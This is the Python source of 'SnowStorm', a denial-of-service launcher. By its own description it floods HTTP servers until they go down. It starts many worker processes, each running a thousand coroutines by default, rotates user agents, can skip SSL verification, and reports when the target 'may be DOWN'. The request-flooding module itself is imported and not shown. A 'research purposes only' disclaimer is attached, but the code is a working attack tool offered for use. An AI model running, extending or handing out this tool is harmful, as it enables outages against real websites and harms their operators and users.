#!/usr/bin/env python

"""
                                                                                                           


This tool is a dos tool that is meant to put heavy load on HTTP servers
in order to bring them to their knees by exhausting the resource pool.

This tool is meant for research purposes only
and any malicious usage of this tool is prohibited.




LICENSE:
This software is distributed under the GNU General Public License version 3 (GPLv3)

LEGAL NOTICE:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
"""
import random
import aiohttp
import asyncio
from multiprocessing import Process, Manager
from urllib.parse import urlparse
import sys
import random
import time
import ssl
import argparse


#import laser_test as Laser
import Laser
# Python version-specific
if sys.version_info < (3, 5):
    # Python 2.x
    error("This program need python 3.5+")

####
# Config
####
DEBUG = False

####
# Constants
####
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0


METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'
agents = []

class SnowStorm(object):

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None

    # Properties
    url = None

    # Options

    method = METHOD_GET

    def __init__(self, url, workers, coros, method, sslcheck, no_payload):
        self.no_payload = no_payload
        self.url = url
        self.sslcheck = sslcheck
        self.coros = coros
        self.manager = Manager()
        self.workers = workers
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print("Shutting down SnowStorm")

    def __del__(self):
        self.exit()

    def printHeader(self):

        # Taunt!
        print("SnowStorm fighting!")

    # Do the fun!
    def Fight(self):

        self.printHeader()
        print(
            f"Hitting webserver in mode {self.method} with {self.workers} workers running {self.coros} coroutine each")

        if DEBUG:
            print(f"Starting {self.workers} concurrent Laser workers")

        # Start workers

        for i in range(int(self.workers)):

            worker = Laser.Laser(self.url, self.coros,
                                 self.counter,agents, self.no_payload,self.sslcheck, debug=DEBUG)
            self.workersQueue.append(worker)
            worker.start()
            if DEBUG:
                print(worker.pid)
            try:
                # self.Run()
                #p = Laser.Laser(self.url, self.coros, self.counter, DEBUG)
                pass

            except (Exception):
                error(f"Failed to start worker {i}")
                pass

        print("Initiating monitor")
        self.monitor()

    def stats(self):

        try:

            if self.counter[0] > 0 or self.counter[1] > 0:

                print(
                    f"{self.counter[0]} SnowStorm punches deferred. ({self.counter[1]} Failed)")

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0]:

                    print("\tServer may be DOWN!")

            self.last_counter[0] = self.counter[0]
            self.last_counter[1] = self.counter[1]

        except (Exception):
            pass  # silently ignore

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print("CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print(f"Killing worker {worker.name}")
                        # worker.terminate()
                        worker.stop()
                    except Exception:
                        pass  # silently ignore
                if DEBUG:
                    raise


####

####
# Other Functions
####


def error(msg):
    # print help information and exit:
    sys.stderr.write(f'{msg}\n')

    sys.exit(2)


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument('-m', '--method', default='get',
                        choices=['get', 'post', 'random'])
    parser.add_argument("-c", "--coros", default=1000, type=int,
                        help='Number of coroutines per process')
    parser.add_argument("-w", "--workers", default=10,
                        type=int, help='Number of concurrent workers')
    parser.add_argument("-d", "--debug", default=False, nargs='?')
    parser.add_argument("--no-payload", default=False, nargs='?')
    parser.add_argument("-n", "--nosslcheck", default=False, type=bool,nargs='?')
    parser.add_argument('-a', '--agent', default=None,nargs='?')
    return parser.parse_args()


def main():

    args = parse_args()
    workers = args.workers
    coros = args.coros
    method = args.method
    url = args.url
    sslcheck = False if args.nosslcheck != False else True
    DEBUG = True if args.debug != False else False

    
    if args.agent:
            try:
                with open(args.agent) as f:
                    agents = f.readlines()
            except EnvironmentError:
                error(f"cannot read file {args.agent}")
    no_payload = True if args.no_payload != False else False
    if url[0:4].lower() != 'http':
        error("Invalid URL supplied")
    snowStorm = SnowStorm(url, workers, coros, method, sslcheck, no_payload)

    snowStorm.Fight()


if __name__ == "__main__":
    main()
